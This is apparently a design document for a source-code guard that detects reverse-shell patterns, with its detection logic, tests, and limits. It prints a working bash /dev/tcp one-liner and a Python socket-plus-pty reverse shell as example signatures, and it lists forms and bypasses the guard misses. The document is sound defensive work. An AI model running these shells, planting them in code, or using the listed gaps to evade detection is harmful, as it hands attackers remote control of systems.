---
type: Guard
title: "reverse-shell-pattern"
description: "No reverse-shell pattern in source (bash /dev/tcp, netcat -e, Python socket+pty)."
timestamp: "2026-10-07T00:00:00Z"
guard_id: "reverse-shell-pattern"
checklist_section: ["8"]
standards: ["OWASP:A03"]
---

# No reverse-shell pattern in source

_Author, 2026-10-07_

---

## The threat

A reverse shell is the single most common "proof of compromise" shape a backdoored
dependency, a malicious AI-agent skill, or a compromised contribution ships: code that
connects OUT to an attacker-controlled host and hands it an interactive shell, so the
attacker never has to reach an inbound port (no firewall-hole needed). Anyone who can
get this code merged, loaded as a dependency, or shipped inside a skill bundle gets a
persistent remote shell. OWASP:A03 (Injection, in the sense of injected malicious
functionality), CWE-506 (Embedded Malicious Code).

## Why this guard fits the stack

This guard is adapted from Datadog GuardDog's `threat-network-reverse-shell` source-code
YARA rule. GuardDog screens third-party registry packages before install; this guard
applies the same two signatures to the target application's own source, where there is
essentially no legitimate reason for either shape to appear:

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
os.dup2(s.fileno(), 0)
pty.spawn("/bin/sh")
```

## Detection design

1. `applies()` gates on `python`, `javascript`, or `typescript` in `profile.features`.
2. Scans `.py`/`.pyi`/`.js`/`.ts`/`.jsx`/`.tsx`/`.mjs`/`.cjs` for every signature below,
   and `.sh`/`.bash`/`.zsh` shell scripts for the shell signatures on every line that
   `claude-code-compromise`'s own reverse-shell pattern (`_REVERSE_SHELL`, imported) does
   not match. That guard scans every shell script at CRITICAL, so a second HIGH under this
   guard's id would duplicate it and would ignore an owner's existing exception or
   `# security: allow-claude-code-compromise` pragma for that rule (PR #1048 review). What it
   misses, and this guard therefore reports in shell scripts: the `/dev/udp/` one-liner, and
   `/dev/tcp/` with a variable host or port (`/dev/tcp/$HOST/$PORT`, `/dev/tcp/${H}/4444`),
   because its pattern needs a literal `host/port`. Netcat `-e` with a variable host is still
   its finding (that pattern has no host constraint). Code in Python/JS/TS files is not
   scanned by that guard, so all forms stay here. Because the dedupe is by line, an owner's
   `# security: allow-claude-code-compromise` pragma or reviewed exception on a
   literal-endpoint line now silences both guards there: that is intended, since the line is
   one finding, and it is the owner's opt-out this dedupe exists to respect. Known gap on
   both sides: `sh -i >& /dev/tcp/$H/$P`, `bash -i &> /dev/tcp/$H/$P` (the `&>` spelling),
   `exec 5<>/dev/tcp/$H/$P`, the fd-196 form and the split-redirect form with a variable
   endpoint are reported by neither guard.
3. Two independent signatures:
   - `bash-dev-tcp` / `netcat-exec-shell`: `bash -i >& /dev/tcp/` (or `/dev/udp/`), or
     `nc`/`ncat` invoked with `-e /bin/sh`/`-e /bin/bash`: checked against a comment-
     stripped view (`comment_view(text, dialect="hash")`) so a documented example in a
     `#`-comment doesn't fire.
   - `python-socket-shell`: a `socket.socket(...).connect(...)` (or a bound socket
     variable's `.connect(...)`) call with, within 15 lines either side of it,
     `pty.spawn(`, a `subprocess` call targeting `/bin/sh`/`/bin/bash` (matched over the
     joined window, so a call broken across lines still counts), or a bare `exec`/`eval`
     call in a file that also mentions `socket`, against the Python comment/string-aware
     view. The finding is at the connect line. A connect and an unrelated `exec`/`eval`
     or terminal helper further apart do not pair: the earlier whole-file co-occurrence
     fired on any client module that also evaluated something (PR #1048 review).
4. Suppress an audited case (a maintained red-team/pentest tool) with a same-line
   comment: `# security: allow-reverse-shell-pattern` (or the shell-dialect equivalent).
5. Both rules emit `severity="high"`, standards `["OWASP:A03", "CWE-506"]`.

## When NOT to flag

A plain outbound client (`socket.connect()` followed by `send`/`recv` of ordinary
protocol data, with no shell-spawn primitive anywhere in the file) never fires: it's
the *pairing* with `pty.spawn`/a shell-targeted subprocess/an `exec`/`eval` within 15
lines that is the signal, not `connect()` alone, and not a shell primitive elsewhere in
the same file. A health-check `nc -z host port` (no `-e` flag)
never fires either. A genuinely maintained offensive-security tool should mark its
code with the suppress pragma shown above.

## Tests

| Test | What it checks |
|---|---|
| `test_fires_on_bash_dev_tcp` | `bash -i >& /dev/tcp/...` inside a Python `os.system` string fires (and `claude-code-compromise` does not see it) |
| `test_fires_on_bash_dev_udp_in_shell_script` | the `/dev/udp/` one-liner in a `.sh` file fires (the one shell shape `claude-code-compromise` misses) |
| `test_fires_on_netcat_exec_shell` | `nc ... -e /bin/sh` inside a JS `exec` string fires |
| `test_fires_on_shell_script_dev_tcp_with_a_variable_host_or_port` | `/dev/tcp/$ATT/$PORT`, `/dev/tcp/${HOST}/4444`, `/dev/tcp/10.0.0.1/$PORT` in a `.sh` file fire here (and `claude-code-compromise` is silent) |
| `test_shell_script_netcat_with_a_variable_host_stays_with_claude_code_compromise` | `nc $H $P -e /bin/sh` stays `claude-code-compromise`'s alone |
| `test_shell_script_tcp_and_netcat_left_to_claude_code_compromise` | the `/dev/tcp/` and netcat forms in `.sh`/`.bash`/`.zsh` stay silent here while `claude-code-compromise/reverse-shell` still fires |
| `test_fires_on_python_socket_connect_pty_spawn` | `connect()` + `pty.spawn()` pairing fires |
| `test_fires_on_python_socket_subprocess_shell_target` | `connect()` + `/bin/sh` subprocess target fires |
| `test_fires_on_python_socket_recv_exec_loop` | `connect()` + `exec(s.recv(...))` fires at the connect line |
| `test_fires_on_python_socket_multiline_subprocess_shell` | a `subprocess.call(` broken across lines after the connect fires |
| `test_passes_socket_connect_and_unrelated_shell_primitive_far_apart` | a connect and an `exec`/`eval`/`pty.spawn` 40+ lines away stay silent |
| `test_passes_ordinary_outbound_client` | bare `connect()`+`send`/`recv`, no shell primitive, stays silent |
| `test_passes_netcat_without_exec_flag` | `nc -z` health check stays silent |
| `test_pragma_suppresses_match_line` | inline pragma suppresses the match line |
| `test_does_not_apply_with_no_relevant_stack` | `applies()` is `False` with no python/js/ts feature |

## Known bypasses

A determined author can trivially evade the exact string shapes here: building the
`/dev/tcp` path via string concatenation or an environment variable, using `/bin/sh -c`
indirection instead of a literal `pty.spawn`, or writing the socket connect and the
shell-spawn primitive in two different files that are only wired together at import
time. This guard is a signature match on the most common copy-pasted idioms, not a
data-flow or taint analysis: it will not catch a deliberately obfuscated or
split-across-files reverse shell.

## What this guard does NOT prove

A clean scan does not mean the application has no outbound-command-and-control
capability: only that it doesn't contain one of these two specific, extremely common
idioms in the clear. A reverse shell built from more exotic primitives (raw socket
syscalls via `ctypes`, a named pipe instead of a TCP socket, a shell spawned via a
third-party library) is out of scope.

# Citations

[1] agentsec checklist item `8-reverse-shell-pattern` (§8)
[2] OWASP:A03
[3] CWE-506
[4] Datadog GuardDog `threat-network-reverse-shell` source-code rule: https://github.com/DataDog/guarddog
